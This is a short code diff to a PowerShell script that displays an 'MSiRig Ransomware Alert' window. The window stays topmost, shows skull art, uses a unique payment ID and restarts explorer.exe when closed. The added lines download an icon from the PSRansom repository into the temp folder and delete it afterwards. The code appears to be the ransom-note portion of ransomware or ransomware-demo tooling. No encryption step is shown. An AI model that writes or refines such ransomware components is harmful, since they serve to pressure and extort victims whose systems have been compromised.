@@ -311,6 +311,19 @@ $form.Topmost = $true
 $form.FormBorderStyle = "FixedSingle"
 $form.Text = "MSiRig Ransomware Alert"
 
+
+# Download and set form icon
+ $formIconUrl = "https://raw.githubusercontent.com/JoelGMSec/PSRansom/main/Demo/PSRansom.ico"
+ $iconTempPath = Join-Path $env:TEMP "psransom_$script:UniquePaymentID.ico"
+ Try {
+        Invoke-WebRequest -Uri $formIconUrl -OutFile $iconTempPath -ErrorAction Stop
+        $form.Icon = New-Object System.Drawing.Icon($iconTempPath)
+        }
+    Catch {
+        Write-Host "[!] Error downloading or setting form icon: $($_.Exception.Message)" -ForegroundColor Red
+        }
+
+
 # Create skull and crossbones ASCII art (simplified)
 $skullLabel = New-Object System.Windows.Forms.Label
 $skullLabel.ForeColor = [System.Drawing.Color]::Red
@@ -486,6 +499,12 @@ $form.Add_Closing({
     Catch {
         Write-Host "[!] Error restarting explorer.exe: $($_.Exception.Message)" -ForegroundColor Red
     }
+
+    # Clean up icon file
+            if (Test-Path $iconTempPath) {
+                Remove-Item $iconTempPath -Force -ErrorAction SilentlyContinue
+            }
+
 })
 
 # Modified to add 2 beeps when the form is shown
